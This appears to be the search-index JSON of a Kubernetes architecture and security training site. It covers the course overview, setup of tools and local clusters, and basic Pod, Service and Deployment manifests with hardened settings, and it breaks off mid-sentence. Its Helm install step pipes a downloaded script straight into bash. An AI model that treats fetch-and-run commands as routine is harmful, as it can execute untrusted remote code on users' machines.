{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Kubernetes Architecture and Security Training","text":"<p>Welcome to the comprehensive Kubernetes Architecture and Security Training program!</p>"},{"location":"#what-youll-learn","title":"\ud83c\udfaf What You'll Learn","text":"<p>This end-to-end training program covers everything from Kubernetes fundamentals through advanced security hardening. Built by practitioners with real-world experience, this material emphasizes:</p> <ul> <li>Architecture: Deep understanding of control plane, networking, storage, and operational patterns</li> <li>Security: Authentication, authorization, pod security, admission control, and supply chain security</li> <li>Operations: High availability, disaster recovery, monitoring, logging, and incident response</li> <li>Best Practices: Production hardening, CIS benchmarks, and compliance</li> </ul>"},{"location":"#course-structure","title":"\ud83d\udcda Course Structure","text":""},{"location":"#part-i-foundation-weeks-1-2","title":"Part I: Foundation (Weeks 1-2)","text":"<p>Build core Kubernetes knowledge through modules 01-04, covering basic resources, control plane architecture, networking fundamentals, and storage systems.</p>"},{"location":"#part-ii-security-weeks-3-4","title":"Part II: Security (Weeks 3-4)","text":"<p>Master Kubernetes security with modules 05-10, including authentication, authorization, pod security, policy enforcement, observability, and supply chain security.</p>"},{"location":"#part-iii-advanced-weeks-5-6","title":"Part III: Advanced (Weeks 5-6)","text":"<p>Achieve production readiness with modules 11-15, covering runtime security, incident response, compliance, multi-cluster patterns, and real-world case studies.</p>"},{"location":"#quick-start","title":"\ud83d\ude80 Quick Start","text":"<pre><code># Clone the repository\ngit clone https://github.com/yourusername/k8s-architecture-and-security-training.git\ncd k8s-architecture-and-security-training\n\n# Set up your local cluster\nmake kind-up\n\n# Start learning with Module 00\nopen docs/00-intro.md\n</code></pre>"},{"location":"#learning-paths","title":"\ud83d\uddfa\ufe0f Learning Paths","text":"<p>Choose your learning path based on your schedule and goals:</p> <ul> <li>Intensive (2 weeks full-time): 8 hours/day, complete all modules</li> <li>Standard (6 weeks part-time): 3-4 hours/day, balanced pace</li> <li>Self-paced (12 weeks): 1-2 hours/day, flexible schedule</li> </ul> <p>Total Time: 65-80 hours including labs and assessments</p>"},{"location":"#whats-included","title":"\ud83d\udcd6 What's Included","text":"<ul> <li>16 Comprehensive Modules: From basics to advanced security</li> <li>Hands-on Labs: Practical exercises with step-by-step instructions</li> <li>Security Tools: kube-bench, Falco, OPA, Trivy, and more</li> <li>Real Examples: Production-ready YAML manifests and configurations</li> <li>Assessments: Quizzes and practical challenges</li> <li>Diagrams: Architecture visualizations and flow charts</li> </ul>"},{"location":"#security-first-approach","title":"\ud83d\udd12 Security-First Approach","text":"<p>Every module emphasizes security best practices:</p> <ul> <li>Secure configurations from the start</li> <li>Defense-in-depth strategies</li> <li>Least privilege access control</li> <li>Practical threat mitigation</li> <li>CIS Kubernetes Benchmark alignment</li> <li>NSA/CISA hardening guidelines</li> </ul>"},{"location":"#who-this-is-for","title":"\ud83c\udf93 Who This Is For","text":"<ul> <li>Platform Engineers building Kubernetes infrastructure</li> <li>DevOps/SRE Teams deploying and securing applications</li> <li>Security Engineers implementing security controls</li> <li>Architects designing multi-cluster environments</li> <li>Developers seeking deep platform understanding</li> </ul>"},{"location":"#prerequisites","title":"\ud83d\udccb Prerequisites","text":"<p>Required: - Basic Linux command line skills - Understanding of containers (Docker basics) - YAML syntax familiarity - Basic networking concepts</p> <p>Recommended: - Infrastructure as Code experience - TLS/PKI knowledge - Cloud provider familiarity</p>"},{"location":"#tools-youll-use","title":"\ud83d\udee0\ufe0f Tools You'll Use","text":"<ul> <li>kubectl: Kubernetes CLI</li> <li>kind/k3d/minikube: Local clusters</li> <li>Helm: Package manager</li> <li>Trivy: Vulnerability scanning</li> <li>Falco: Runtime security</li> <li>OPA/Gatekeeper: Policy enforcement</li> <li>Prometheus/Grafana: Observability</li> </ul>"},{"location":"#getting-started","title":"\ud83c\udf1f Getting Started","text":"<ol> <li>Review Module 00: Introduction for setup instructions</li> <li>Follow the Course Roadmap</li> <li>Complete labs hands-on</li> <li>Test your knowledge with assessments</li> <li>Apply learnings to real environments</li> </ol>"},{"location":"#additional-resources","title":"\ud83d\udcda Additional Resources","text":"<ul> <li>Official Kubernetes Docs</li> <li>CNCF Security TAG</li> <li>CIS Kubernetes Benchmark</li> <li>Complete References</li> </ul>"},{"location":"#contributing","title":"\ud83e\udd1d Contributing","text":"<p>We welcome contributions! See CONTRIBUTING.md for: - How to add new content - Diagram creation guidelines - PR review process - Code of conduct</p>"},{"location":"#license","title":"\ud83d\udcdd License","text":"<p>This project is licensed under the MIT License - see LICENSE for details.</p> <p>Ready to start? Head to Module 00: Introduction and Prerequisites</p> <p>Built with \u2764\ufe0f by Kubernetes practitioners for the community</p>"},{"location":"00-intro/","title":"Module 00: Introduction and Prerequisites","text":""},{"location":"00-intro/#overview","title":"Overview","text":"<p>Welcome to the Kubernetes Architecture and Security Training program. This comprehensive course is designed to take you from Kubernetes fundamentals through advanced security hardening, with hands-on labs and real-world scenarios based on production experience.</p> <p>This module establishes the foundation for your learning journey, covering prerequisites, learning objectives, and environment setup.</p> <p>Estimated Time: 1 hour</p>"},{"location":"00-intro/#learning-objectives","title":"Learning Objectives","text":"<p>By completing this module, you will:</p> <ul> <li>Understand the course structure and learning path</li> <li>Verify you have the necessary prerequisites</li> <li>Set up your local lab environment</li> <li>Familiarize yourself with key Kubernetes terminology</li> <li>Understand the security-first approach used throughout this training</li> </ul>"},{"location":"00-intro/#target-audience","title":"Target Audience","text":"<p>This training is designed for:</p> <ul> <li>Platform Engineers building and operating Kubernetes platforms</li> <li>DevOps/SRE Teams deploying and securing applications</li> <li>Security Engineers implementing security controls</li> <li>Architects designing multi-cluster environments</li> <li>Developers seeking deep platform understanding</li> </ul>"},{"location":"00-intro/#prerequisites","title":"Prerequisites","text":""},{"location":"00-intro/#required-knowledge","title":"Required Knowledge","text":"<p>Linux Basics (confidence level: intermediate) - Command line navigation and file operations - Understanding of processes, users, and permissions - Basic shell scripting concepts - Text editing (vim, nano, or your preferred editor)</p> <p>Container Fundamentals (confidence level: beginner to intermediate) - What containers are and how they differ from VMs - Docker basics: building and running containers - Understanding container images and registries - Basic Dockerfile syntax</p> <p>YAML Syntax (confidence level: beginner) - Key-value pairs and nesting - Lists and arrays - Data types (strings, numbers, booleans) - Indentation significance</p> <p>Networking Concepts (confidence level: beginner) - IP addressing and subnetting - DNS and name resolution - TCP/IP and common ports - Basic routing concepts</p>"},{"location":"00-intro/#recommended-knowledge","title":"Recommended Knowledge","text":"<ul> <li>Infrastructure as Code concepts (Terraform, Ansible)</li> <li>TLS/PKI basics (certificates, public/private keys)</li> <li>Experience with cloud providers (Azure, AWS, or GCP)</li> <li>Git version control</li> <li>CI/CD fundamentals</li> </ul>"},{"location":"00-intro/#software-requirements","title":"Software Requirements","text":"<p>Install the following tools on your local machine:</p> <p>Essential Tools:</p> <ol> <li> <p>kubectl - Kubernetes command-line tool    <pre><code># macOS (via Homebrew)\nbrew install kubectl\n\n# Linux\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nsudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n\n# Verify\nkubectl version --client\n</code></pre></p> </li> <li> <p>kind (Kubernetes in Docker) - Recommended for labs    <pre><code># macOS\nbrew install kind\n\n# Linux\ncurl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.20.0/kind-linux-amd64\nchmod +x ./kind\nsudo mv ./kind /usr/local/bin/kind\n\n# Verify\nkind version\n</code></pre></p> </li> <li> <p>Docker or Podman - Container runtime    <pre><code># macOS\nbrew install --cask docker\n\n# Ubuntu/Debian\nsudo apt-get update\nsudo apt-get install docker.io\nsudo usermod -aG docker $USER  # Logout and login\n\n# Verify\ndocker version\n</code></pre></p> </li> <li> <p>Helm - Kubernetes package manager    <pre><code># macOS\nbrew install helm\n\n# Linux\ncurl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash\n\n# Verify\nhelm version\n</code></pre></p> </li> </ol> <p>Alternative Cluster Tools (optional):</p> <ul> <li>k3d: Lightweight k3s in Docker</li> <li>minikube: Local Kubernetes with multiple runtime options</li> </ul> <p>Recommended Tools:</p> <ul> <li>jq: JSON processor for kubectl output</li> <li>yq: YAML processor</li> <li>kubectx/kubens: Context and namespace switcher</li> <li>k9s: Terminal UI for Kubernetes</li> </ul>"},{"location":"00-intro/#hardware-requirements","title":"Hardware Requirements","text":"<p>Minimum: - CPU: 2 cores - RAM: 8 GB - Disk: 20 GB free</p> <p>Recommended: - CPU: 4 cores - RAM: 16 GB - Disk: 50 GB free</p>"},{"location":"00-intro/#course-structure","title":"Course Structure","text":""},{"location":"00-intro/#part-i-foundation-modules-01-04","title":"Part I: Foundation (Modules 01-04)","text":"<p>Build core Kubernetes knowledge: - Basic resources and concepts - Control plane architecture - Networking fundamentals - Storage systems</p>"},{"location":"00-intro/#part-ii-security-modules-05-10","title":"Part II: Security (Modules 05-10)","text":"<p>Master Kubernetes security: - Authentication and authorization - Pod security standards - Policy enforcement - Supply chain security - Network security</p>"},{"location":"00-intro/#part-iii-advanced-modules-11-15","title":"Part III: Advanced (Modules 11-15)","text":"<p>Production readiness: - Runtime security - Incident response - Compliance and benchmarks - Multi-cluster patterns - Real-world case studies</p>"},{"location":"00-intro/#learning-path-options","title":"Learning Path Options","text":"<p>Intensive Track (2 weeks, full-time) - 8 hours per day - Complete all modules sequentially - All labs and assessments</p> <p>Standard Track (6 weeks, part-time) - 3-4 hours per day - Balanced pace with review time - Recommended for working professionals</p> <p>Self-Paced Track (12 weeks) - 1-2 hours per day - Flexible schedule - Suitable for independent learners</p>"},{"location":"00-intro/#key-concepts-and-glossary","title":"Key Concepts and Glossary","text":"<p>Before diving in, familiarize yourself with these core terms:</p> <p>Cluster Architecture:</p> <ul> <li>Cluster: A set of machines (nodes) running containerized applications</li> <li>Control Plane: Components that manage the cluster state</li> <li>Node: A worker machine in Kubernetes (VM or physical machine)</li> <li>Pod: The smallest deployable unit containing one or more containers</li> </ul> <p>Core Resources:</p> <ul> <li>Deployment: Manages a replicated set of Pods</li> <li>Service: Exposes Pods to network traffic</li> <li>Namespace: Virtual cluster for resource isolation</li> <li>ConfigMap: Configuration data as key-value pairs</li> <li>Secret: Sensitive data (credentials, tokens)</li> </ul> <p>Networking:</p> <ul> <li>CNI: Container Network Interface plugin</li> <li>Ingress: HTTP/HTTPS routing to Services</li> <li>NetworkPolicy: Rules for Pod network traffic</li> <li>Service Mesh: Infrastructure layer for service-to-service communication</li> </ul> <p>Security:</p> <ul> <li>RBAC: Role-Based Access Control</li> <li>PSA: Pod Security Admission</li> <li>Admission Controller: Plugins that govern API requests</li> <li>SecComp: Secure Computing Mode (syscall filtering)</li> <li>AppArmor: Linux security module</li> </ul> <p>Complete glossary: See Kubernetes Glossary</p>"},{"location":"00-intro/#security-first-approach","title":"Security-First Approach","text":"<p>This training emphasizes security at every layer:</p> <ol> <li>Secure by Default: Learn secure configurations from the start</li> <li>Defense in Depth: Multiple layers of security controls</li> <li>Least Privilege: Minimum necessary permissions</li> <li>Assume Breach: Design for containment and detection</li> <li>Security as Code: Automated, repeatable security controls</li> </ol> <p>Core Security Principles:</p> <ul> <li>Never run containers as root (unless absolutely necessary)</li> <li>Always use RBAC with least privilege</li> <li>Implement NetworkPolicies for traffic control</li> <li>Scan images for vulnerabilities before deployment</li> <li>Enable audit logging</li> <li>Use Pod Security Standards</li> <li>Encrypt data in transit and at rest</li> </ul>"},{"location":"00-intro/#lab-environment-setup","title":"Lab Environment Setup","text":""},{"location":"00-intro/#option-1-kind-recommended","title":"Option 1: kind (Recommended)","text":"<pre><code># Create cluster with custom config\ncat &lt;&lt;EOF | kind create cluster --name training --config=-\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n- role: worker\n- role: worker\nEOF\n\n# Verify cluster\nkubectl cluster-info --context kind-training\nkubectl get nodes\n\n# Expected output:\n# NAME                     STATUS   ROLES           AGE   VERSION\n# training-control-plane   Ready    control-plane   1m    v1.28.0\n# training-worker          Ready    &lt;none&gt;          1m    v1.28.0\n# training-worker2         Ready    &lt;none&gt;          1m    v1.28.0\n</code></pre>"},{"location":"00-intro/#option-2-k3d","title":"Option 2: k3d","text":"<pre><code># Create cluster\nk3d cluster create training --servers 1 --agents 2\n\n# Verify\nkubectl get nodes\n</code></pre>"},{"location":"00-intro/#option-3-minikube","title":"Option 3: minikube","text":"<pre><code># Create cluster\nminikube start --nodes 3 --cpus 2 --memory 4096\n\n# Verify\nkubectl get nodes\n</code></pre>"},{"location":"00-intro/#verify-installation","title":"Verify Installation","text":"<p>Run this verification script:</p> <pre><code>#!/bin/bash\n# verify-setup.sh\n\necho \"=== Kubernetes Cluster Verification ===\"\n\n# Check kubectl\nif ! command -v kubectl &amp;&gt; /dev/null; then\n    echo \"\u274c kubectl not found\"\n    exit 1\nfi\necho \"\u2705 kubectl found: $(kubectl version --client --short 2&gt;/dev/null)\"\n\n# Check cluster connection\nif ! kubectl cluster-info &amp;&gt; /dev/null; then\n    echo \"\u274c Cannot connect to cluster\"\n    exit 1\nfi\necho \"\u2705 Connected to cluster\"\n\n# Check nodes\nNODE_COUNT=$(kubectl get nodes --no-headers 2&gt;/dev/null | wc -l)\nif [ \"$NODE_COUNT\" -lt 1 ]; then\n    echo \"\u274c No nodes found\"\n    exit 1\nfi\necho \"\u2705 Found $NODE_COUNT node(s)\"\n\n# Check node status\nNOT_READY=$(kubectl get nodes --no-headers 2&gt;/dev/null | grep -v \" Ready\" | wc -l)\nif [ \"$NOT_READY\" -gt 0 ]; then\n    echo \"\u26a0\ufe0f  Warning: $NOT_READY node(s) not ready\"\nelse\n    echo \"\u2705 All nodes ready\"\nfi\n\n# Check essential pods\necho \"\"\necho \"=== Essential System Pods ===\"\nkubectl get pods -n kube-system\n\necho \"\"\necho \"\ud83c\udf89 Setup verification complete!\"\n</code></pre>"},{"location":"00-intro/#accessing-cluster","title":"Accessing Cluster","text":"<pre><code># View current context\nkubectl config current-context\n\n# List all contexts\nkubectl config get-contexts\n\n# Switch context (if multiple clusters)\nkubectl config use-context kind-training\n\n# View cluster info\nkubectl cluster-info\n\n# Check API server\nkubectl get --raw /healthz\n</code></pre>"},{"location":"00-intro/#learning-resources","title":"Learning Resources","text":""},{"location":"00-intro/#official-documentation","title":"Official Documentation","text":"<ul> <li>Kubernetes Docs - Primary reference <sup>1</sup></li> <li>Kubernetes API Reference</li> <li>kubectl Cheat Sheet</li> </ul>"},{"location":"00-intro/#security-resources","title":"Security Resources","text":"<ul> <li>CNCF Security TAG - Community security guidance <sup>2</sup></li> <li>CIS Kubernetes Benchmark - Security standards <sup>3</sup></li> <li>NSA/CISA Kubernetes Hardening Guide <sup>4</sup></li> </ul>"},{"location":"00-intro/#community","title":"Community","text":"<ul> <li>Kubernetes Slack: slack.k8s.io</li> <li>Discuss Forum: discuss.kubernetes.io</li> <li>Stack Overflow: <code>kubernetes</code> tag</li> </ul>"},{"location":"00-intro/#assessment-readiness","title":"Assessment Readiness","text":"<p>Before proceeding to Module 01, ensure you can:</p> <ul> <li>[ ] Successfully create a local Kubernetes cluster</li> <li>[ ] Run <code>kubectl get nodes</code> and see Ready nodes</li> <li>[ ] Understand basic YAML structure</li> <li>[ ] Navigate the command line confidently</li> <li>[ ] Access and search Kubernetes documentation</li> </ul>"},{"location":"00-intro/#troubleshooting-common-setup-issues","title":"Troubleshooting Common Setup Issues","text":""},{"location":"00-intro/#docker-not-running","title":"Docker Not Running","text":"<pre><code># Check Docker status\ndocker ps\n\n# Start Docker (systemd Linux)\nsudo systemctl start docker\n\n# macOS - start Docker Desktop application\n</code></pre>"},{"location":"00-intro/#kind-cluster-creation-fails","title":"kind Cluster Creation Fails","text":"<pre><code># Check Docker resources (need at least 4GB RAM)\ndocker info | grep Memory\n\n# Delete existing cluster and retry\nkind delete cluster --name training\nkind create cluster --name training\n</code></pre>"},{"location":"00-intro/#kubectl-cannot-connect","title":"kubectl Cannot Connect","text":"<pre><code># Check kubeconfig\nkubectl config view\n\n# Verify context\nkubectl config current-context\n\n# Test connection\nkubectl cluster-info\n</code></pre>"},{"location":"00-intro/#next-steps","title":"Next Steps","text":"<p>Once your environment is ready:</p> <ol> <li>Complete the Basic Kubernetes concepts lab</li> <li>Review the Course Roadmap</li> <li>Proceed to Module 01: Kubernetes Basics</li> </ol>"},{"location":"00-intro/#references","title":"References","text":"<p>Ready to begin? Proceed to Module 01: Kubernetes Basics</p> <ol> <li> <p>Kubernetes Official Documentation, accessed November 2025\u00a0\u21a9</p> </li> <li> <p>CNCF TAG Security, accessed November 2025\u00a0\u21a9</p> </li> <li> <p>CIS Kubernetes Benchmark v1.8, accessed November 2025\u00a0\u21a9</p> </li> <li> <p>NSA/CISA Kubernetes Hardening Guidance v1.2, August 2022\u00a0\u21a9</p> </li> </ol>"},{"location":"01-k8s-basics/","title":"Module 01: Kubernetes Basics","text":""},{"location":"01-k8s-basics/#overview","title":"Overview","text":"<p>Estimated Time: 3-4 hours</p> <p>Module Type: Foundation</p> <p>Prerequisites: Basic understanding of containers and Docker</p> <p>This module introduces the fundamental building blocks of Kubernetes. You will learn about the core resources that form the foundation of any Kubernetes deployment: Pods, Services, Deployments, ReplicaSets, and how they work together. Additionally, you'll understand how Kubernetes organizes resources using labels, selectors, and namespaces.</p>"},{"location":"01-k8s-basics/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Explain what Pods are and how they serve as the atomic unit of deployment in Kubernetes</li> <li>Describe the purpose and functionality of Services in providing stable networking endpoints</li> <li>Understand how Deployments manage application lifecycle and rolling updates</li> <li>Identify the relationship between Deployments, ReplicaSets, and Pods</li> <li>Use labels and selectors to organize and query Kubernetes resources</li> <li>Leverage namespaces for resource isolation and multi-tenancy</li> <li>Write basic YAML manifests for Pods, Services, and Deployments</li> <li>Apply security best practices to basic Kubernetes resources</li> </ol>"},{"location":"01-k8s-basics/#1-pods-the-atomic-unit","title":"1. Pods: The Atomic Unit","text":""},{"location":"01-k8s-basics/#11-what-is-a-pod","title":"1.1 What is a Pod?","text":"<p>A Pod is the smallest deployable unit in Kubernetes. It represents a single instance of a running process in your cluster and can contain one or more containers that share:</p> <ul> <li>Network namespace (same IP address and port space)</li> <li>Storage volumes</li> <li>Configuration data</li> </ul> <p>Key Characteristics: - Pods are ephemeral and disposable - Each Pod gets a unique IP address - Containers within a Pod communicate via <code>localhost</code> - Pods are scheduled together on the same node</p>"},{"location":"01-k8s-basics/#12-single-vs-multi-container-pods","title":"1.2 Single vs Multi-Container Pods","text":"<p>Single-Container Pods (most common): <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\n    tier: frontend\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.21.6\n    ports:\n    - containerPort: 80\n    resources:\n      requests:\n        memory: \"64Mi\"\n        cpu: \"250m\"\n      limits:\n        memory: \"128Mi\"\n        cpu: \"500m\"\n    securityContext:\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      runAsUser: 1000\n      capabilities:\n        drop:\n        - ALL\n</code></pre></p> <p>Multi-Container Pods (sidecar pattern): <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: app-with-sidecar\nspec:\n  containers:\n  - name: main-app\n    image: myapp:1.0\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: shared-logs\n      mountPath: /var/log/app\n  - name: log-shipper\n    image: fluentd:v1.14\n    volumeMounts:\n    - name: shared-logs\n      mountPath: /var/log/app\n      readOnly: true\n  volumes:\n  - name: shared-logs\n    emptyDir: {}\n</code></pre></p>"},{"location":"01-k8s-basics/#13-pod-lifecycle","title":"1.3 Pod Lifecycle","text":"<p>Pods go through several phases: - Pending: Pod accepted but containers not yet created - Running: Pod bound to node, containers created - Succeeded: All containers terminated successfully - Failed: All containers terminated, at least one failed - Unknown: Pod state cannot be determined</p>"},{"location":"01-k8s-basics/#2-services-stable-network-endpoints","title":"2. Services: Stable Network Endpoints","text":""},{"location":"01-k8s-basics/#21-why-services","title":"2.1 Why Services?","text":"<p>Pods are ephemeral\u2014they come and go. When a Pod dies and is replaced, it gets a new IP address. Services solve this problem by providing:</p> <ul> <li>A stable IP address and DNS name</li> <li>Load balancing across multiple Pods</li> <li>Service discovery within the cluster</li> </ul>"},{"location":"01-k8s-basics/#22-service-types","title":"2.2 Service Types","text":"<p>ClusterIP (default): Exposes the Service on an internal IP in the cluster.</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: backend-service\n  labels:\n    app: backend\nspec:\n  type: ClusterIP\n  selector:\n    app: backend\n    tier: api\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n</code></pre> <p>NodePort: Exposes the Service on each Node's IP at a static port (30000-32767).</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend-nodeport\nspec:\n  type: NodePort\n  selector:\n    app: frontend\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n    nodePort: 30080\n</code></pre> <p>LoadBalancer: Provisions an external load balancer (cloud provider dependent).</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: web-loadbalancer\nspec:\n  type: LoadBalancer\n  selector:\n    app: web\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n</code></pre> <p>ExternalName: Maps a Service to a DNS name (for external services).</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: external-db\nspec:\n  type: ExternalName\n  externalName: database.example.com\n</code></pre>"},{"location":"01-k8s-basics/#3-deployments-and-replicasets","title":"3. Deployments and ReplicaSets","text":""},{"location":"01-k8s-basics/#31-replicasets","title":"3.1 ReplicaSets","text":"<p>A ReplicaSet ensures that a specified number of Pod replicas are running at any given time. While you can create ReplicaSets directly, you typically manage them through Deployments.</p> <pre><code>apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend-replicaset\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.21.6\n        ports:\n        - containerPort: 80\n</code></pre>"},{"location":"01-k8s-basics/#32-deployments-declarative-updates","title":"3.2 Deployments: Declarative Updates","text":"<p>Deployments provide declarative updates for Pods and ReplicaSets. They manage:</p> <ul> <li>Rolling updates and rollbacks</li> <li>Scaling</li> <li>Pause and resume of rollouts</li> <li>History and revision tracking</li> </ul> <p>Production-Ready Deployment:</p> <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-deployment\n  labels:\n    app: api\n    version: v1\nspec:\n  replicas: 3\n  revisionHistoryLimit: 10\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxSurge: 1\n      maxUnavailable: 0\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n        version: v1\n    spec:\n      securityContext:\n        runAsNonRoot: true\n        fsGroup: 1000\n      containers:\n      - name: api\n        image: myapi:1.2.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        env:\n        - name: LOG_LEVEL\n          value: \"info\"\n        resources:\n          requests:\n            memory: \"256Mi\"\n            cpu: \"500m\"\n          limits:\n            memory: \"512Mi\"\n            cpu: \"1000m\"\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsUser: 1000\n          capabilities:\n            drop:\n            - ALL\n</code></pre>"},{"location":"01-k8s-basics/#33-deployment-strategies","title":"3.3 Deployment Strategies","text":"<p>RollingUpdate (default): - Gradually replaces old Pods with new ones - Zero downtime deployments - Controlled by <code>maxSurge</code> and <code>maxUnavailable</code></p> <p>Recreate: - Terminates all existing Pods before creating new ones - Causes downtime but useful for incompatible changes</p>"},{"location":"01-k8s-basics/#4-labels-and-selectors","title":"4. Labels and Selectors","text":""},{"location":"01-k8s-basics/#41-labels","title":"4.1 Labels","text":"<p>Labels are key-value pairs attached to objects (Pods, Services, Deployments, etc.). They are used to organize and select subsets of objects.</p> <p>Best Practices for Labels:</p> <pre><code>metadata:\n  labels:\n    app.kubernetes.io/name: myapp\n    app.kubernetes.io/instance: myapp-prod\n    app.kubernetes.io/version: \"1.2.3\"\n    app.kubernetes.io/component: api\n    app.kubernetes.io/part-of: ecommerce-platform\n    app.kubernetes.io/managed-by: kubectl\n    environment: production\n    tier: backend\n    cost-center: engineering\n</code></pre>"},{"location":"01-k8s-basics/#42-selectors","title":"4.2 Selectors","text":"<p>Selectors allow you to filter objects based on their labels.</p> <p>Equality-based: <pre><code>selector:\n  matchLabels:\n    app: nginx\n    tier: frontend\n</code></pre></p> <p>Set-based: <pre><code>selector:\n  matchExpressions:\n  - key: environment\n    operator: In\n    values:\n    - production\n    - staging\n  - key: tier\n    operator: NotIn\n    values:\n    - cache\n  - key: app\n    operator: Exists\n</code></pre></p>"},{"location":"01-k8s-basics/#5-namespaces-resource-isolation","title":"5. Namespaces: Resource Isolation","text":""},{"location":"01-k8s-basics/#51-what-are-namespaces","title":"5.1 What are Namespaces?","text":"<p>Namespaces provide a mechanism for isolating groups of resources within a single cluster. They are ideal for:</p> <ul> <li>Multi-tenancy</li> <li>Environment separation (dev, staging, prod)</li> <li>Team/project isolation</li> <li>Resource quota enforcement</li> </ul>"},{"location":"01-k8s-basics/#52-default-namespaces","title":"5.2 Default Namespaces","text":"<ul> <li><code>default</code>: Default namespace for objects with no namespace specified</li> <li><code>kube-system</code>: For objects created by Kubernetes system</li> <li><code>kube-public</code>: Readable by all users, reserved for cluster usage</li> <li><code>kube-node-lease</code>: Holds node lease objects for node heartbeat data</li> </ul>"},{"location":"01-k8s-basics/#53-creating-and-using-namespaces","title":"5.3 Creating and Using Namespaces","text":"<pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\n  name: development\n  labels:\n    name: development\n    environment: dev\n</code></pre> <p>With Resource Quotas:</p> <pre><code>apiVersion: v1\nkind: ResourceQuota\nmetadata:\n  name: dev-quota\n  namespace: development\nspec:\n  hard:\n    requests.cpu: \"10\"\n    requests.memory: 20Gi\n    limits.cpu: \"20\"\n    limits.memory: 40Gi\n    pods: \"50\"\n    services: \"10\"\n    persistentvolumeclaims: \"5\"\n</code></pre> <p>Deploying to a Namespace:</p> <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: development\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myapp\n  template:\n    metadata:\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: app\n        image: myapp:dev\n</code></pre>"},{"location":"01-k8s-basics/#6-pod-to-service-relationship-diagram","title":"6. Pod-to-Service Relationship Diagram","text":"<pre><code>graph TB\n    subgraph \"Kubernetes Cluster\"\n        subgraph \"Namespace: production\"\n            D[Deployment: web-app&lt;br/&gt;replicas: 3]\n\n            D --&gt;|manages| RS[ReplicaSet&lt;br/&gt;desired: 3, current: 3]\n\n            RS --&gt;|creates/manages| P1[Pod: web-app-abc123&lt;br/&gt;IP: 10.244.1.5]\n            RS --&gt;|creates/manages| P2[Pod: web-app-def456&lt;br/&gt;IP: 10.244.2.8]\n            RS --&gt;|creates/manages| P3[Pod: web-app-ghi789&lt;br/&gt;IP: 10.244.3.2]\n\n            S[Service: web-service&lt;br/&gt;Type: ClusterIP&lt;br/&gt;IP: 10.96.0.10&lt;br/&gt;Port: 80]\n\n            S -.-&gt;|selector: app=web| P1\n            S -.-&gt;|selector: app=web| P2\n            S -.-&gt;|selector: app=web| P3\n\n            C1[Client Pod]\n            C2[External Client]\n\n            C1 --&gt;|DNS: web-service.production.svc.cluster.local| S\n            C2 --&gt;|LoadBalancer IP| LB[LoadBalancer Service]\n            LB --&gt; S\n        end\n\n        subgraph \"Labels\"\n            L1[app: web&lt;br/&gt;version: v1&lt;br/&gt;tier: frontend]\n        end\n\n        P1 -.-&gt;|has labels| L1\n        P2 -.-&gt;|has labels| L1\n        P3 -.-&gt;|has labels| L1\n    end\n\n    style D fill:#326CE5,stroke:#fff,color:#fff\n    style RS fill:#326CE5,stroke:#fff,color:#fff\n    style P1 fill:#13AA52,stroke:#fff,color:#fff\n    style P2 fill:#13AA52,stroke:#fff,color:#fff\n    style P3 fill:#13AA52,stroke:#fff,color:#fff\n    style S fill:#FF6B6B,stroke:#fff,color:#fff</code></pre>"},{"location":"01-k8s-basics/#7-best-practices","title":"7. Best Practices","text":""},{"location":"01-k8s-basics/#71-pod-best-practices","title":"7.1 Pod Best Practices","text":"<ol> <li>Always define resource requests and limits</li> <li>Ensures proper scheduling and prevents resource starvation</li> <li> <p>Helps the cluster scheduler make informed decisions</p> </li> <li> <p>Use liveness and readiness probes</p> </li> <li>Liveness: Restarts unhealthy containers</li> <li> <p>Readiness: Controls when Pod receives traffic</p> </li> <li> <p>Avoid running as root</p> </li> <li>Set <code>runAsNonRoot: true</code></li> <li> <p>Specify <code>runAsUser</code> with a non-privileged UID</p> </li> <li> <p>Use read-only root filesystem when possible</p> </li> <li>Set <code>readOnlyRootFilesystem: true</code></li> <li> <p>Mount writable volumes only where needed</p> </li> <li> <p>Drop unnecessary capabilities</p> </li> <li>Drop ALL capabilities by default</li> <li>Add back only what's needed</li> </ol>"},{"location":"01-k8s-basics/#72-deployment-best-practices","title":"7.2 Deployment Best Practices","text":"<ol> <li>Use 